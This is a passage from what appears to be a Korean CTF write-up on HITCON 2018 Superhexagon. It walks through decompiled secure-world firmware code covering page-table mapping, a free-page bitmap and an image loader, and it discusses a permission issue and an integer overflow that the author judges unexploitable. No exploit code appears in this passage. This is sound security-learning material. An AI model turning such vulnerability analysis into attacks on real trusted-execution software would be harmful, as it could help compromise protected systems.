</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ((((r2 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) <span style="color:#f92672">||</span> ((r2 <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xfff</span>) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>)) <span style="color:#f92672">||</span> ((r1 <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xfff</span>) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>)) <span style="color:#f92672">||</span>
</span></span><span style="display:flex;"><span>     (((r1 <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x40000000</span> <span style="color:#f92672">||</span> (iVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">FUN_0800054a</span>(r2), iVar1 <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)) <span style="color:#f92672">||</span>
</span></span><span style="display:flex;"><span>      (iVar2 <span style="color:#f92672">=</span> <span style="color:#a6e22e">FUN_080003da</span>(iVar1,r1,r2,<span style="color:#ae81ff">2</span>), iVar2 <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)))) {
</span></span><span style="display:flex;"><span>    iVar1 <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> iVar1;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Secure physical address에 대한 접근은 제한된다.
그런데 약간의 문제가 발생할 여지가 있다.
<img loading="lazy" src="/blog/Hitcon_2018_Superhexagon/aca5811777159c1cb95140ec67cd08a3.png" alt=""  />

권한 설정에 문제가 존재한다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>undefined4 <span style="color:#a6e22e">FUN_080004c2</span>(uint VA,<span style="color:#66d9ef">int</span> sz)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> iVar1;
</span></span><span style="display:flex;"><span>  uint uVar2;
</span></span><span style="display:flex;"><span>  uint uVar3;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> cnt;
</span></span><span style="display:flex;"><span>  uint va;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> local_c;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  cnt <span style="color:#f92672">=</span> sz;
</span></span><span style="display:flex;"><span>  va <span style="color:#f92672">=</span> VA;
</span></span><span style="display:flex;"><span>                    <span style="color:#75715e">/* VA can be duplicated  */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">do</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (cnt <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">1</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    uVar2 <span style="color:#f92672">=</span> va <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">0x15</span> <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0x7f</span>;
</span></span><span style="display:flex;"><span>    uVar3 <span style="color:#f92672">=</span> va <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">0xc</span> <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0x1ff</span>;
</span></span><span style="display:flex;"><span>    iVar1 <span style="color:#f92672">=</span> uVar2 <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ((<span style="color:#f92672">*</span>(uint <span style="color:#f92672">*</span>)(<span style="color:#f92672">&amp;</span>trans_table_lvl1 <span style="color:#f92672">+</span> iVar1) <span style="color:#f92672">|</span> <span style="color:#f92672">*</span>(uint <span style="color:#f92672">*</span>)(iVar1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x8004004</span>)) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>      local_c <span style="color:#f92672">=</span> (uVar3 <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x1000</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>      iVar1 <span style="color:#f92672">=</span> (uVar3 <span style="color:#f92672">+</span> uVar2 <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x200</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ((<span style="color:#f92672">*</span>(uint <span style="color:#f92672">*</span>)(<span style="color:#f92672">&amp;</span>trans_table_lvl2 <span style="color:#f92672">+</span> iVar1) <span style="color:#f92672">|</span> <span style="color:#f92672">*</span>(uint <span style="color:#f92672">*</span>)(iVar1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x8005004</span>)) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      local_c <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1000</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    va <span style="color:#f92672">=</span> local_c <span style="color:#f92672">+</span> va;
</span></span><span style="display:flex;"><span>    cnt <span style="color:#f92672">=</span> cnt <span style="color:#f92672">-</span> local_c;
</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">while</span>( true );
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>이해를 못했던 라인이 있었었는데 tans_table_lvl2에 0x200 * 8 을 더해서 접근하는 이유는 lvl2 page table이 연속적이기 때문이었다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>undefined4 <span style="color:#a6e22e">FUN_080003da</span>(<span style="color:#66d9ef">int</span> param_1,<span style="color:#66d9ef">int</span> phys,<span style="color:#66d9ef">int</span> sz,undefined4 prop)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> iVar1;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> size;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> phys_addr;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> VA;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  size <span style="color:#f92672">=</span> sz;
</span></span><span style="display:flex;"><span>  phys_addr <span style="color:#f92672">=</span> phys;
</span></span><span style="display:flex;"><span>  VA <span style="color:#f92672">=</span> param_1;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">while</span>( true ) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (size <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    iVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">FUN_080001e8</span>(VA,phys_addr,prop);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (iVar1 <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>    VA <span style="color:#f92672">=</span> VA <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1000</span>;
</span></span><span style="display:flex;"><span>    phys_addr <span style="color:#f92672">=</span> phys_addr <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1000</span>;
</span></span><span style="display:flex;"><span>    size <span style="color:#f92672">=</span> size <span style="color:#f92672">+</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">0x1000</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0xffffffff</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>분석한 결과를 토대로 FUN_0800054a은 그냥 할당되지 않은 VA를 리턴하는 함수라는 것을 알 수 있다.
FUN_080003da은 컨트롤 불가능한 Secure VA와 Non-secure PA와 size, 고정된 attribute 값을 인자로 받는다.
integer overflow 버그가 존재한다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">const</span> MemMapEntry memmap[] <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    <span style="color:#75715e">/* Space up to 0x8000000 is reserved for a boot ROM */</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    [VIRT_FLASH] <span style="color:#f92672">=</span>              {          <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x08000000</span> },
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    [VIRT_CPUPERIPHS] <span style="color:#f92672">=</span>         { <span style="color:#ae81ff">0x08000000</span>, <span style="color:#ae81ff">0x00020000</span> },
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    [VIRT_UART] <span style="color:#f92672">=</span>               { <span style="color:#ae81ff">0x09000000</span>, <span style="color:#ae81ff">0x00001000</span> },
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    [VIRT_SECURE_MEM] <span style="color:#f92672">=</span>         { <span style="color:#ae81ff">0x0e000000</span>, <span style="color:#ae81ff">0x01000000</span> },
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    [VIRT_MEM] <span style="color:#f92672">=</span>                { <span style="color:#ae81ff">0x40000000</span>, RAMLIMIT_BYTES },
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>};
</span></span></code></pre></div><p>MMIO로 FLASH가 0x0 번지 쪽에 있다는 것을 알 수 있는데, 취약점으로 0x0 번지를 할당받아도 최대 사이즈 검증 때문에 절대 FLASH 영역을 벗어날 수 없다.
write를 하더라도 qemu 에뮬레이터는 실제 환경과 동일하게 FLASH의 read only를 보장한다.
악용할 수 없는 취약점이다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>undefined4 <span style="color:#a6e22e">FUN_080001e8</span>(uint addr,uint phys_addr,uint param_3)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  uint uVar1;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> iVar2;
</span></span><span style="display:flex;"><span>  uint uVar3;
</span></span><span style="display:flex;"><span>  uint local_30;
</span></span><span style="display:flex;"><span>  uint uStack_2c;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  local_30 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x60f</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ((param_3 <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">2</span>) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>    local_30 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x64f</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ((param_3 <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>    local_30 <span style="color:#f92672">=</span> local_30 <span style="color:#f92672">|</span> <span style="color:#ae81ff">0x80</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  uStack_2c <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ((param_3 <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">4</span>) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>    uStack_2c <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x400000</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ((param_3 <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">8</span>) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>    uStack_2c <span style="color:#f92672">=</span> uStack_2c <span style="color:#f92672">|</span> <span style="color:#ae81ff">0x200000</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ((param_3 <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0x10</span>) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>    local_30 <span style="color:#f92672">=</span> local_30 <span style="color:#f92672">|</span> <span style="color:#ae81ff">0x20</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  uVar3 <span style="color:#f92672">=</span> addr <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">0x15</span> <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0x7f</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ((<span style="color:#f92672">*</span>(uint <span style="color:#f92672">*</span>)(<span style="color:#f92672">&amp;</span>trans_table_lvl1 <span style="color:#f92672">+</span> uVar3 <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>) <span style="color:#f92672">|</span> <span style="color:#f92672">*</span>(uint <span style="color:#f92672">*</span>)(uVar3 <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x8004004</span>)) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>    uVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">FUN_0800019c</span>(<span style="color:#f92672">&amp;</span>trans_table_lvl2 <span style="color:#f92672">+</span> uVar3 <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x1000</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>(uint <span style="color:#f92672">*</span>)(<span style="color:#f92672">&amp;</span>trans_table_lvl1 <span style="color:#f92672">+</span> uVar3 <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>) <span style="color:#f92672">=</span> uVar1 <span style="color:#f92672">|</span> <span style="color:#ae81ff">3</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">FUN_08001944</span>(<span style="color:#f92672">&amp;</span>trans_table_lvl2 <span style="color:#f92672">+</span> uVar3 <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x1000</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0x1000</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  iVar2 <span style="color:#f92672">=</span> ((addr <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">0xc</span> <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0x1ff</span>) <span style="color:#f92672">+</span> uVar3 <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x200</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">*</span>(uint <span style="color:#f92672">*</span>)(<span style="color:#f92672">&amp;</span>trans_table_lvl2 <span style="color:#f92672">+</span> iVar2) <span style="color:#f92672">=</span> local_30 <span style="color:#f92672">|</span> phys_addr;
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">*</span>(uint <span style="color:#f92672">*</span>)(iVar2 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x8005004</span>) <span style="color:#f92672">=</span> uStack_2c;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>내부적으로 walk해서 다음과 같이 할당한다.
이때 넘어가는 물리 주소는 비트맵을 통해 관리되며 할당 해제된 상태에선 1로 마스킹된다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">FUN_080006ba</span>(<span style="color:#66d9ef">int</span> phys)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  uint uVar1;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  uVar1 <span style="color:#f92672">=</span> phys <span style="color:#f92672">-</span> secure_phys_max <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">17</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (uVar1 <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x20</span>) {
</span></span><span style="display:flex;"><span>    v0[uVar1] <span style="color:#f92672">=</span> v0[uVar1] <span style="color:#f92672">|</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">&lt;&lt;</span> (<span style="color:#ae81ff">0x1f</span> <span style="color:#f92672">-</span> (phys <span style="color:#f92672">-</span> secure_phys_max <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">12</span> <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0</span>b00011111) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>2 진수로 보면 편한데, 내부적으로 Secure VA를 PA로 변환하고 0을 대입한다.
그리고 size 만큼 루프돌면서 위 함수를 호출하는데, 이는 v0에 일종의 bitmap 방식으로 freed memory를 마킹한다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>undefined4 <span style="color:#a6e22e">FUN_080007ea</span>(uint r1,uint r2)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  undefined4 uVar1;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (((((r1 <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xfff</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) <span style="color:#f92672">&amp;&amp;</span> (<span style="color:#ae81ff">0x1ffffff</span> <span style="color:#f92672">&lt;</span> r1)) <span style="color:#f92672">&amp;&amp;</span> (r1 <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x2400000</span>)) <span style="color:#f92672">&amp;&amp;</span>
</span></span><span style="display:flex;"><span>     ((r2 <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">&amp;&amp;</span> (r2 <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0x2400000</span> <span style="color:#f92672">-</span> r1)))) {
</span></span><span style="display:flex;"><span>    uVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">FUN_08000c38</span>((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)r1,r2);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>    uVar1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xffffffff</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> uVar1;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>undefined4 <span style="color:#a6e22e">FUN_08000c38</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>param_1,undefined4 param_2)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> iVar1;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> iVar2;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> iVar3;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> iVar4;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> sz;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  iVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">verify</span>(param_1,param_2);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (iVar1 <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>    iVar4 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(<span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>)(param_1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10</span>);
</span></span><span style="display:flex;"><span>    sz <span style="color:#f92672">=</span> ((<span style="color:#f92672">*</span>(<span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>)(param_1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">1U</span> <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">0xc</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x1000</span>;
</span></span><span style="display:flex;"><span>    iVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">alloca</span>(<span style="color:#f92672">*</span>(<span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>)(param_1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xc</span>),sz,<span style="color:#ae81ff">10</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ((((iVar1 <span style="color:#f92672">!=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) <span style="color:#f92672">&amp;&amp;</span>
</span></span><span style="display:flex;"><span>         ((iVar1 <span style="color:#f92672">=</span> ((<span style="color:#f92672">*</span>(<span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>)(param_1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x18</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">1U</span> <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">0xc</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x1000</span>,
</span></span><span style="display:flex;"><span>          <span style="color:#f92672">*</span>(<span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>)(param_1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x18</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">||</span>
</span></span><span style="display:flex;"><span>          (iVar2 <span style="color:#f92672">=</span> <span style="color:#a6e22e">alloca</span>(<span style="color:#f92672">*</span>(<span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>)(param_1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x14</span>),iVar1,<span style="color:#ae81ff">0xe</span>), iVar2 <span style="color:#f92672">!=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)))) <span style="color:#f92672">&amp;&amp;</span>
</span></span><span style="display:flex;"><span>        ((iVar2 <span style="color:#f92672">=</span> ((<span style="color:#f92672">*</span>(<span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>)(param_1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x20</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">1U</span> <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">0xc</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x1000</span>,
</span></span><span style="display:flex;"><span>         <span style="color:#f92672">*</span>(<span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>)(param_1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x20</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">||</span>
</span></span><span style="display:flex;"><span>         (iVar3 <span style="color:#f92672">=</span> <span style="color:#a6e22e">alloca</span>(<span style="color:#f92672">*</span>(<span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>)(param_1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1c</span>),iVar2,<span style="color:#ae81ff">0xe</span>), iVar3 <span style="color:#f92672">!=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)))) <span style="color:#f92672">&amp;&amp;</span>
</span></span><span style="display:flex;"><span>       (iVar3 <span style="color:#f92672">=</span> <span style="color:#a6e22e">alloca</span>(<span style="color:#ae81ff">0xff8000</span>,<span style="color:#ae81ff">0x8000</span>,<span style="color:#ae81ff">0xe</span>), iVar3 <span style="color:#f92672">!=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)) {
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">FUN_08001944</span>(<span style="color:#f92672">*</span>(undefined4 <span style="color:#f92672">*</span>)(param_1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xc</span>),<span style="color:#ae81ff">0</span>,sz);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">FUN_08001906</span>(<span style="color:#f92672">*</span>(undefined4 <span style="color:#f92672">*</span>)(param_1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xc</span>),param_1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x24</span>,<span style="color:#f92672">*</span>(undefined4 <span style="color:#f92672">*</span>)(param_1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10</span>));
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>(<span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>)(param_1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x18</span>) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">FUN_08001944</span>(<span style="color:#f92672">*</span>(undefined4 <span style="color:#f92672">*</span>)(param_1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x14</span>),<span style="color:#ae81ff">0</span>,iVar1);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">FUN_08001906</span>(<span style="color:#f92672">*</span>(undefined4 <span style="color:#f92672">*</span>)(param_1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x14</span>),param_1 <span style="color:#f92672">+</span> iVar4 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x24</span>,
</span></span><span style="display:flex;"><span>                     <span style="color:#f92672">*</span>(undefined4 <span style="color:#f92672">*</span>)(param_1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x18</span>));
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>(<span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>)(param_1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x20</span>) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">FUN_08001944</span>(<span style="color:#f92672">*</span>(undefined4 <span style="color:#f92672">*</span>)(param_1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1c</span>),<span style="color:#ae81ff">0</span>,iVar2);
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">FUN_08001944</span>(<span style="color:#ae81ff">0xff8000</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0x8000</span>);
</span></span><span style="display:flex;"><span>      Entry <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(dword <span style="color:#f92672">*</span>)(param_1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span>);
</span></span><span style="display:flex;"><span>      tci_handle <span style="color:#f92672">=</span> (TCI <span style="color:#f92672">**</span>)(<span style="color:#f92672">*</span>(<span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>)(param_1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x20</span>) <span style="color:#f92672">+</span> <span style="color:#f92672">*</span>(<span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>)(param_1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1c</span>) <span style="color:#f92672">+</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">4</span>);
